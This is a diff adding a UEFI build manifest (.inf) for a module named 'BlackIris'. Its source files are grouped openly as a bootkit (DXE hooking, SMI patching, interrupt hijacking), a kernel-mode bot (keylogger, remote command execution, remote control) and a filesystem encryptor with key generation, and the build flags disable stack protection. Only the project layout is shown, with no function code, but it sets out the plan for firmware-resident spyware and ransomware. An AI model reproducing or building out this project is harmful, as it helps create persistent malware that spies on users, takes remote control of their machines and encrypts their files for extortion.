@@ -1,0 +1,61 @@
+[Defines]
+  INF_VERSION                    = 0x00010005
+  BASE_NAME                      = BlackIris
+  FILE_GUID                      = C0B4F1A1-1A25-4F4D-BE71-94F4E42AF999
+  MODULE_TYPE                    = UEFI_APPLICATION
+  VERSION_STRING                 = 1.0
+  ENTRY_POINT                    = SyrialEntryPoint
+
+[Sources]
+  # Bootkit
+  src/Boot/Loader.c
+  src/Boot/DXEHook.c
+  src/Boot/PatchSMI.c
+  src/Boot/Entry.c
+  src/Boot/InterruptHijack.c
+
+  # Bot
+  src/KernelMode/Keylogger.c
+  src/KernelMode/CommandExec.c
+  src/KernelMode/RemoteControl.c
+  src/KernelMode/Scheduler.c
+  src/KernelMode/BotStartup.c
+
+  # Encryptor
+  src/Encryptor/AESCore.c
+  src/Encryptor/XORPayload.c
+  src/Encryptor/EncryptFS.c
+  src/Encryptor/FileMapper.c
+  src/Encryptor/KeyGen.c
+
+  # Shared
+  src/Shared/Utils.c
+  src/Shared/EFIWrappers.c
+  src/Shared/Logger.c
+  src/Shared/MemTools.c
+  src/Shared/SyscallBridge.c
+
+[Packages]
+  MdePkg/MdePkg.dec
+
+[LibraryClasses]
+  UefiBootServicesTableLib
+  UefiRuntimeServicesTableLib
+  UefiLib
+  BaseLib
+  MemoryAllocationLib
+  DebugLib
+  PrintLib
+  BaseMemoryLib
+  FileHandleLib
+  DevicePathLib
+
+[Protocols]
+  gEfiLoadedImageProtocolGuid
+  gEfiSimpleFileSystemProtocolGuid
+
+[Guids]
+  gEfiFileInfoGuid
+
+[BuildOptions]
+  GCC:*_*_*_CC_FLAGS = -Wall -Wno-unused -fno-stack-protector -mno-red-zone
